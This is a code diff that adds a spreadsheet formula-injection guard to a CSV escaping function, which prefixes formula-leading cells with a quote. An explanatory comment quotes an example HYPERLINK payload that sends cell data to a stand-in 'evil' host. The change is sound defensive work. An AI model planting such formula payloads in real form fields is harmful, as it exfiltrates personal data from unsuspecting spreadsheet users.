@@ -6,9 +6,21 @@
 // with a newline silently breaks the CSV layout (one row spread across two,
 // columns shifting). Since these files are imported into Brevo / Excel, a
 // malformed row = silent data loss.
+//
+// Formula-injection guard: Excel / LibreOffice evaluate any cell starting
+// with =, +, -, @, \t, or \r as a formula — even when the cell came from a
+// quoted CSV field. Several columns we export contain text from public
+// forms (b2b_quotes.message, school_lists.raw_text, customer names from
+// Shopify…). An attacker who submits `=HYPERLINK("https://evil/?d="&A2,…)`
+// in the public devis form turns the SAV CSV download into a one-click
+// PII exfiltration. Prepending a single quote is the OWASP-recommended
+// neutralizer — Excel renders it as text, the leading quote is invisible.
+
+const FORMULA_PREFIX = /^[=+\-@\t\r]/;
 
 export const csvEscape = (value: unknown): string => {
-  const s = value == null ? '' : String(value);
+  let s = value == null ? '' : String(value);
+  if (FORMULA_PREFIX.test(s)) s = "'" + s;
   return `"${s.replace(/"/g, '""')}"`;
 };
 
